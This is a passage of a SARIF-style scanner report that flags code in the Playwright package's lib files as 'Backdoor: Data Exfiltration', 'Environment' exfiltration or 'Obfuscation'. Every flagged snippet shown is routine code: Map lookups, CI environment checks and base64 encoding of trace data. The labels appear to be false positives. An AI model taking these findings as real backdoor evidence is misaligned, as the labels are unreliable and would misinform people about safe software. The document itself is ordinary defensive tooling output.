                      "markdown": "`:!1,Random:!1,ReactiveDict:!1,ReactiveVar:!1,Router:!1,ServiceConfiguration:!1,Session:!1,share:!1,Spacebars:!1,Template:!1,Tinytest:!1,Tracker:!1,UI:!1,Utils:!1,WebApp:!1,WebAppInternals:!1},mongo:{_isWindows:!1,_rand:!1,BulkWriteResult:!1,cat:!1,cd:!1,connect:!1,db:!1,getHostName:!1,getMemInfo:!1,hostname:!1,ISODate:!1,listFiles:!1,load:!1,ls:!1,md5sumFile:!1,mkdir:!1,Mongo:!1,NumberInt:!1,NumberLong:!1,ObjectId:!1,PlanCache:!1,print:!1,printjson:!1,pwd:!1,quit:!1,removeFile:!1,rs:!1,sh:!1,UUID:!1,version:!1,WriteResult:!1},applescript:{$:!1,Application:!1,Automation:!1,console:!1,delay:!1,Library:!`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/testLoader.js"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 57,
                  "endLine": 41,
                  "endColumn": 62,
                  "snippet": {
                    "text": "// we make these maps global.\nconst cachedFileSuites = new Map();\nasync function loadTestFile(file, rootDir, testErrors) {\n  if (cachedFileSuites.has(file)) return cachedFileSuites.get(file);\n  const suite = new _test.Suite(_path.default.relative(rootDir, file) || _path.default.basename(file), 'file');\n  suite._requireFile = file;\n  suite.location = {\n",
                    "rendered": {
                      "text": "// we make these maps global.\nconst cachedFileSuites = new Map();\nasync function loadTestFile(file, rootDir, testErrors) {\n  if (cachedFileSuites.has(file)) return cachedFileSuites.get(file);\n  const suite = new _test.Suite(_path.default.relative(rootDir, file) || _path.default.basename(file), 'file');\n  suite._requireFile = file;\n  suite.location = {\n",
                      "markdown": "`// we make these maps global.\nconst cachedFileSuites = new Map();\nasync function loadTestFile(file, rootDir, testErrors) {\n  if (cachedFileSuites.has(file)) return cachedFileSuites.get(file);\n  const suite = new _test.Suite(_path.default.relative(rootDir, file) || _path.default.basename(file), 'file');\n  suite._requireFile = file;\n  suite.location = {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/testLoader.js"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 233,
                  "endLine": 17,
                  "endColumn": 238,
                  "snippet": {
                    "text": "etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]",
                    "rendered": {
                      "text": "etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]",
                      "markdown": "`etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/config.js"
                },
                "region": {
                  "startLine": 257,
                  "startColumn": 50,
                  "endLine": 257,
                  "endColumn": 61,
                  "snippet": {
                    "text": "  });\n}\nconst defaultGrep = exports.defaultGrep = /.*/;\nconst defaultReporter = exports.defaultReporter = process.env.CI ? 'dot' : 'list';\nconst configInternalSymbol = Symbol('configInternalSymbol');\nfunction getProjectId(project) {\n  return project.__projectId;\n",
                    "rendered": {
                      "text": "  });\n}\nconst defaultGrep = exports.defaultGrep = /.*/;\nconst defaultReporter = exports.defaultReporter = process.env.CI ? 'dot' : 'list';\nconst configInternalSymbol = Symbol('configInternalSymbol');\nfunction getProjectId(project) {\n  return project.__projectId;\n",
                      "markdown": "`  });\n}\nconst defaultGrep = exports.defaultGrep = /.*/;\nconst defaultReporter = exports.defaultReporter = process.env.CI ? 'dot' : 'list';\nconst configInternalSymbol = Symbol('configInternalSymbol');\nfunction getProjectId(project) {\n  return project.__projectId;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/poolBuilder.js"
                },
                "region": {
                  "startLine": 73,
                  "startColumn": 30,
                  "endLine": 73,
                  "endColumn": 35,
                  "snippet": {
                    "text": "      const pool = new _fixtures.FixturePool(testType.fixtures, e => this._handleLoadError(e, testErrors), undefined, undefined, optionOverrides);\n      this._testTypePools.set(testType, pool);\n    }\n    return this._testTypePools.get(testType);\n  }\n  _handleLoadError(e, testErrors) {\n    if (testErrors) testErrors.push(e);else throw new Error(`${(0, _util.formatLocation)(e.location)}: ${e.message}`);\n",
                    "rendered": {
                      "text": "      const pool = new _fixtures.FixturePool(testType.fixtures, e => this._handleLoadError(e, testErrors), undefined, undefined, optionOverrides);\n      this._testTypePools.set(testType, pool);\n    }\n    return this._testTypePools.get(testType);\n  }\n  _handleLoadError(e, testErrors) {\n    if (testErrors) testErrors.push(e);else throw new Error(`${(0, _util.formatLocation)(e.location)}: ${e.message}`);\n",
                      "markdown": "`      const pool = new _fixtures.FixturePool(testType.fixtures, e => this._handleLoadError(e, testErrors), undefined, undefined, optionOverrides);\n      this._testTypePools.set(testType, pool);\n    }\n    return this._testTypePools.get(testType);\n  }\n  _handleLoadError(e, testErrors) {\n    if (testErrors) testErrors.push(e);else throw new Error(`${(0, _util.formatLocation)(e.location)}: ${e.message}`);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/testTree.js"
                },
                "region": {
                  "startLine": 234,
                  "startColumn": 29,
                  "endLine": 234,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    return result;\n  }\n  treeItemById(id) {\n    return this._treeItemById.get(id);\n  }\n  collectTestIds(treeItem) {\n    return treeItem ? collectTestIds(treeItem) : new Set();\n",
                    "rendered": {
                      "text": "    return result;\n  }\n  treeItemById(id) {\n    return this._treeItemById.get(id);\n  }\n  collectTestIds(treeItem) {\n    return treeItem ? collectTestIds(treeItem) : new Set();\n",
                      "markdown": "`    return result;\n  }\n  treeItemById(id) {\n    return this._treeItemById.get(id);\n  }\n  collectTestIds(treeItem) {\n    return treeItem ? collectTestIds(treeItem) : new Set();\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/testTree.js"
                },
                "region": {
                  "startLine": 163,
                  "startColumn": 47,
                  "endLine": 163,
                  "endColumn": 52,
                  "snippet": {
                    "text": "  _fileItem(filePath, isFile) {\n    if (filePath.length === 0) return this.rootItem;\n    const fileName = filePath.join(this.pathSeparator);\n    const existingFileItem = this._treeItemById.get(fileName);\n    if (existingFileItem) return existingFileItem;\n    const parentFileItem = this._fileItem(filePath.slice(0, filePath.length - 1), false);\n    const fileItem = {\n",
                    "rendered": {
                      "text": "  _fileItem(filePath, isFile) {\n    if (filePath.length === 0) return this.rootItem;\n    const fileName = filePath.join(this.pathSeparator);\n    const existingFileItem = this._treeItemById.get(fileName);\n    if (existingFileItem) return existingFileItem;\n    const parentFileItem = this._fileItem(filePath.slice(0, filePath.length - 1), false);\n    const fileItem = {\n",
                      "markdown": "`  _fileItem(filePath, isFile) {\n    if (filePath.length === 0) return this.rootItem;\n    const fileName = filePath.join(this.pathSeparator);\n    const existingFileItem = this._treeItemById.get(fileName);\n    if (existingFileItem) return existingFileItem;\n    const parentFileItem = this._fileItem(filePath.slice(0, filePath.length - 1), false);\n    const fileItem = {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/testTree.js"
                },
                "region": {
                  "startLine": 141,
                  "startColumn": 150,
                  "endLine": 141,
                  "endColumn": 155,
                  "snippet": {
                    "text": "== null || runningTestIds === void 0 ? void 0 : runningTestIds.has(t.id))) return false;\n      testCase.children = testCase.children.filter(test => {\n        return !filtersStatuses || (runningTestIds === null || runningTestIds === void 0 ? void 0 : runningTestIds.has(test.test.id)) || statusFilters.get(test.status);\n      });\n      testCase.tests = testCase.children.map(c => c.test);\n      return !!testCase.children.length;\n    };\n    const visit = treeItem => {\n      const newChildren = [];\n      for (const child of treeItem.children) {\n        if (child.kind === 'case') {\n          if (filter(ch",
                    "rendered": {
                      "text": "== null || runningTestIds === void 0 ? void 0 : runningTestIds.has(t.id))) return false;\n      testCase.children = testCase.children.filter(test => {\n        return !filtersStatuses || (runningTestIds === null || runningTestIds === void 0 ? void 0 : runningTestIds.has(test.test.id)) || statusFilters.get(test.status);\n      });\n      testCase.tests = testCase.children.map(c => c.test);\n      return !!testCase.children.length;\n    };\n    const visit = treeItem => {\n      const newChildren = [];\n      for (const child of treeItem.children) {\n        if (child.kind === 'case') {\n          if (filter(ch",
                      "markdown": "`== null || runningTestIds === void 0 ? void 0 : runningTestIds.has(t.id))) return false;\n      testCase.children = testCase.children.filter(test => {\n        return !filtersStatuses || (runningTestIds === null || runningTestIds === void 0 ? void 0 : runningTestIds.has(test.test.id)) || statusFilters.get(test.status);\n      });\n      testCase.tests = testCase.children.map(c => c.test);\n      return !!testCase.children.length;\n    };\n    const visit = treeItem => {\n      const newChildren = [];\n      for (const child of treeItem.children) {\n        if (child.kind === 'case') {\n          if (filter(ch`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/testTree.js"
                },
                "region": {
                  "startLine": 117,
                  "startColumn": 43,
                  "endLine": 117,
                  "endColumn": 48,
                  "snippet": {
                    "text": "      }\n    };\n    for (const projectSuite of (rootSuite === null || rootSuite === void 0 ? void 0 : rootSuite.suites) || []) {\n      if (filterProjects && !projectFilters.get(projectSuite.title)) continue;\n      for (const fileSuite of projectSuite.suites) {\n        const fileItem = this._fileItem(fileSuite.location.file.split(pathSeparator), true);\n        visitSuite(projectSuite.project(), fileSuite, fileItem);\n",
                    "rendered": {
                      "text": "      }\n    };\n    for (const projectSuite of (rootSuite === null || rootSuite === void 0 ? void 0 : rootSuite.suites) || []) {\n      if (filterProjects && !projectFilters.get(projectSuite.title)) continue;\n      for (const fileSuite of projectSuite.suites) {\n        const fileItem = this._fileItem(fileSuite.location.file.split(pathSeparator), true);\n        visitSuite(projectSuite.project(), fileSuite, fileItem);\n",
                      "markdown": "`      }\n    };\n    for (const projectSuite of (rootSuite === null || rootSuite === void 0 ? void 0 : rootSuite.suites) || []) {\n      if (filterProjects && !projectFilters.get(projectSuite.title)) continue;\n      for (const fileSuite of projectSuite.suites) {\n        const fileItem = this._fileItem(fileSuite.location.file.split(pathSeparator), true);\n        visitSuite(projectSuite.project(), fileSuite, fileItem);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/isomorphic/stringInternPool.js"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 34,
                  "endLine": 28,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    this._stringCache = new Map();\n  }\n  internString(s) {\n    let result = this._stringCache.get(s);\n    if (!result) {\n      this._stringCache.set(s, s);\n      result = s;\n",
                    "rendered": {
                      "text": "    this._stringCache = new Map();\n  }\n  internString(s) {\n    let result = this._stringCache.get(s);\n    if (!result) {\n      this._stringCache.set(s, s);\n      result = s;\n",
                      "markdown": "`    this._stringCache = new Map();\n  }\n  internString(s) {\n    let result = this._stringCache.get(s);\n    if (!result) {\n      this._stringCache.set(s, s);\n      result = s;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/workerMain.js"
                },
                "region": {
                  "startLine": 260,
                  "startColumn": 49,
                  "endLine": 260,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n    // Process existing annotations dynamically set for parent suites.\n    for (const suite of suites) {\n      const extraAnnotations = this._activeSuites.get(suite) || [];\n      for (const annotation of extraAnnotations) processAnnotation(annotation);\n    }\n    this._currentTest = testInfo;\n",
                    "rendered": {
                      "text": "\n    // Process existing annotations dynamically set for parent suites.\n    for (const suite of suites) {\n      const extraAnnotations = this._activeSuites.get(suite) || [];\n      for (const annotation of extraAnnotations) processAnnotation(annotation);\n    }\n    this._currentTest = testInfo;\n",
                      "markdown": "`\n    // Process existing annotations dynamically set for parent suites.\n    for (const suite of suites) {\n      const extraAnnotations = this._activeSuites.get(suite) || [];\n      for (const annotation of extraAnnotations) processAnnotation(annotation);\n    }\n    this._currentTest = testInfo;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/workerMain.js"
                },
                "region": {
                  "startLine": 202,
                  "startColumn": 31,
                  "endLine": 202,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        for (let i = 0; i < tests.length; i++) {\n          // Do not run tests after full cleanup, because we are entirely done.\n          if (this._isStopped && this._didRunFullCleanup) break;\n          const entry = entries.get(tests[i].id);\n          entries.delete(tests[i].id);\n          (0, _util.debugTest)(`test started \"${tests[i].title}\"`);\n          await this._runTest(tests[i], entry.retry, tests[i + 1]);\n",
                    "rendered": {
                      "text": "        for (let i = 0; i < tests.length; i++) {\n          // Do not run tests after full cleanup, because we are entirely done.\n          if (this._isStopped && this._didRunFullCleanup) break;\n          const entry = entries.get(tests[i].id);\n          entries.delete(tests[i].id);\n          (0, _util.debugTest)(`test started \"${tests[i].title}\"`);\n          await this._runTest(tests[i], entry.retry, tests[i + 1]);\n",
                      "markdown": "`        for (let i = 0; i < tests.length; i++) {\n          // Do not run tests after full cleanup, because we are entirely done.\n          if (this._isStopped && this._didRunFullCleanup) break;\n          const entry = entries.get(tests[i].id);\n          entries.delete(tests[i].id);\n          (0, _util.debugTest)(`test started \"${tests[i].title}\"`);\n          await this._runTest(tests[i], entry.retry, tests[i + 1]);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/workerMain.js"
                },
                "region": {
                  "startLine": 80,
                  "startColumn": 9,
                  "endLine": 80,
                  "endColumn": 20,
                  "snippet": {
                    "text": "      (_this$_currentTest = this._currentTest) === null || _this$_currentTest === void 0 || _this$_currentTest._tracing.appendStdioToTrace('stdout', chunk);\n      return true;\n    };\n    if (!process.env.PW_RUNNER_DEBUG) {\n      process.stderr.write = chunk => {\n        var _this$_currentTest2;\n        this.dispatchEvent('stdErr', (0, _ipc.stdioChunkToParams)(chunk));\n",
                    "rendered": {
                      "text": "      (_this$_currentTest = this._currentTest) === null || _this$_currentTest === void 0 || _this$_currentTest._tracing.appendStdioToTrace('stdout', chunk);\n      return true;\n    };\n    if (!process.env.PW_RUNNER_DEBUG) {\n      process.stderr.write = chunk => {\n        var _this$_currentTest2;\n        this.dispatchEvent('stdErr', (0, _ipc.stdioChunkToParams)(chunk));\n",
                      "markdown": "`      (_this$_currentTest = this._currentTest) === null || _this$_currentTest === void 0 || _this$_currentTest._tracing.appendStdioToTrace('stdout', chunk);\n      return true;\n    };\n    if (!process.env.PW_RUNNER_DEBUG) {\n      process.stderr.write = chunk => {\n        var _this$_currentTest2;\n        this.dispatchEvent('stdErr', (0, _ipc.stdioChunkToParams)(chunk));\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/workerMain.js"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 4,
                  "endLine": 64,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    // Contains dynamic annotations originated by modifiers with a callback, e.g. `test.skip(() => true)`.\n    this._activeSuites = new Map();\n    process.env.TEST_WORKER_INDEX = String(params.workerIndex);\n    process.env.TEST_PARALLEL_INDEX = String(params.parallelIndex);\n    (0, _globals.setIsWorkerProcess)();\n    this._params = params;\n    this._fixtureRunner = new _fixtureRunner.FixtureRunner();\n",
                    "rendered": {
                      "text": "    // Contains dynamic annotations originated by modifiers with a callback, e.g. `test.skip(() => true)`.\n    this._activeSuites = new Map();\n    process.env.TEST_WORKER_INDEX = String(params.workerIndex);\n    process.env.TEST_PARALLEL_INDEX = String(params.parallelIndex);\n    (0, _globals.setIsWorkerProcess)();\n    this._params = params;\n    this._fixtureRunner = new _fixtureRunner.FixtureRunner();\n",
                      "markdown": "`    // Contains dynamic annotations originated by modifiers with a callback, e.g. `test.skip(() => true)`.\n    this._activeSuites = new Map();\n    process.env.TEST_WORKER_INDEX = String(params.workerIndex);\n    process.env.TEST_PARALLEL_INDEX = String(params.parallelIndex);\n    (0, _globals.setIsWorkerProcess)();\n    this._params = params;\n    this._fixtureRunner = new _fixtureRunner.FixtureRunner();\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/workerMain.js"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 4,
                  "endLine": 63,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    // These suites still need afterAll hooks to be executed for the proper cleanup.\n    // Contains dynamic annotations originated by modifiers with a callback, e.g. `test.skip(() => true)`.\n    this._activeSuites = new Map();\n    process.env.TEST_WORKER_INDEX = String(params.workerIndex);\n    process.env.TEST_PARALLEL_INDEX = String(params.parallelIndex);\n    (0, _globals.setIsWorkerProcess)();\n    this._params = params;\n",
                    "rendered": {
                      "text": "    // These suites still need afterAll hooks to be executed for the proper cleanup.\n    // Contains dynamic annotations originated by modifiers with a callback, e.g. `test.skip(() => true)`.\n    this._activeSuites = new Map();\n    process.env.TEST_WORKER_INDEX = String(params.workerIndex);\n    process.env.TEST_PARALLEL_INDEX = String(params.parallelIndex);\n    (0, _globals.setIsWorkerProcess)();\n    this._params = params;\n",
                      "markdown": "`    // These suites still need afterAll hooks to be executed for the proper cleanup.\n    // Contains dynamic annotations originated by modifiers with a callback, e.g. `test.skip(() => true)`.\n    this._activeSuites = new Map();\n    process.env.TEST_WORKER_INDEX = String(params.workerIndex);\n    process.env.TEST_PARALLEL_INDEX = String(params.parallelIndex);\n    (0, _globals.setIsWorkerProcess)();\n    this._params = params;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testTracing.js"
                },
                "region": {
                  "startLine": 245,
                  "startColumn": 93,
                  "endLine": 245,
                  "endColumn": 99,
                  "snippet": {
                    "text": "      name: a.name,\n      contentType: a.contentType,\n      path: a.path,\n      base64: (_a$body = a.body) === null || _a$body === void 0 ? void 0 : _a$body.toString('base64')\n    };\n  });\n}\n",
                    "rendered": {
                      "text": "      name: a.name,\n      contentType: a.contentType,\n      path: a.path,\n      base64: (_a$body = a.body) === null || _a$body === void 0 ? void 0 : _a$body.toString('base64')\n    };\n  });\n}\n",
                      "markdown": "`      name: a.name,\n      contentType: a.contentType,\n      path: a.path,\n      base64: (_a$body = a.body) === null || _a$body === void 0 ? void 0 : _a$body.toString('base64')\n    };\n  });\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testTracing.js"
                },
                "region": {
                  "startLine": 245,
                  "startColumn": 6,
                  "endLine": 245,
                  "endColumn": 12,
                  "snippet": {
                    "text": "      name: a.name,\n      contentType: a.contentType,\n      path: a.path,\n      base64: (_a$body = a.body) === null || _a$body === void 0 ? void 0 : _a$body.toString('base64')\n    };\n  });\n}\n",
                    "rendered": {
                      "text": "      name: a.name,\n      contentType: a.contentType,\n      path: a.path,\n      base64: (_a$body = a.body) === null || _a$body === void 0 ? void 0 : _a$body.toString('base64')\n    };\n  });\n}\n",
                      "markdown": "`      name: a.name,\n      contentType: a.contentType,\n      path: a.path,\n      base64: (_a$body = a.body) === null || _a$body === void 0 ? void 0 : _a$body.toString('base64')\n    };\n  });\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testTracing.js"
                },
                "region": {
                  "startLine": 207,
                  "startColumn": 70,
                  "endLine": 207,
                  "endColumn": 76,
                  "snippet": {
                    "text": "      type,\n      timestamp: (0, _utils.monotonicTime)(),\n      text: typeof chunk === 'string' ? chunk : undefined,\n      base64: typeof chunk === 'string' ? undefined : chunk.toString('base64')\n    });\n  }\n  appendBeforeActionForStep(callId, parentId, apiName, params, stack) {\n",
                    "rendered": {
                      "text": "      type,\n      timestamp: (0, _utils.monotonicTime)(),\n      text: typeof chunk === 'string' ? chunk : undefined,\n      base64: typeof chunk === 'string' ? undefined : chunk.toString('base64')\n    });\n  }\n  appendBeforeActionForStep(callId, parentId, apiName, params, stack) {\n",
                      "markdown": "`      type,\n      timestamp: (0, _utils.monotonicTime)(),\n      text: typeof chunk === 'string' ? chunk : undefined,\n      base64: typeof chunk === 'string' ? undefined : chunk.toString('base64')\n    });\n  }\n  appendBeforeActionForStep(callId, parentId, apiName, params, stack) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testTracing.js"
                },
                "region": {
                  "startLine": 207,
                  "startColumn": 6,
                  "endLine": 207,
                  "endColumn": 12,
                  "snippet": {
                    "text": "      type,\n      timestamp: (0, _utils.monotonicTime)(),\n      text: typeof chunk === 'string' ? chunk : undefined,\n      base64: typeof chunk === 'string' ? undefined : chunk.toString('base64')\n    });\n  }\n  appendBeforeActionForStep(callId, parentId, apiName, params, stack) {\n",
                    "rendered": {
                      "text": "      type,\n      timestamp: (0, _utils.monotonicTime)(),\n      text: typeof chunk === 'string' ? chunk : undefined,\n      base64: typeof chunk === 'string' ? undefined : chunk.toString('base64')\n    });\n  }\n  appendBeforeActionForStep(callId, parentId, apiName, params, stack) {\n",
                      "markdown": "`      type,\n      timestamp: (0, _utils.monotonicTime)(),\n      text: typeof chunk === 'string' ? chunk : undefined,\n      base64: typeof chunk === 'string' ? undefined : chunk.toString('base64')\n    });\n  }\n  appendBeforeActionForStep(callId, parentId, apiName, params, stack) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/worker/testTracing.js"
                },
                "region": {
                  "startLine": 171,
                  "startColumn": 26,
                  "endLine": 171,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        const sha1 = (0, _utils.calculateSha1)(content);\n        attachment.sha1 = sha1;\n        delete attachment.path;\n        delete attachment.base64;\n        if (sha1s.has(sha1)) continue;\n        sha1s.add(sha1);\n        zipFile.addBuffer(content, 'resources/' + sha1);\n",
                    "rendered": {
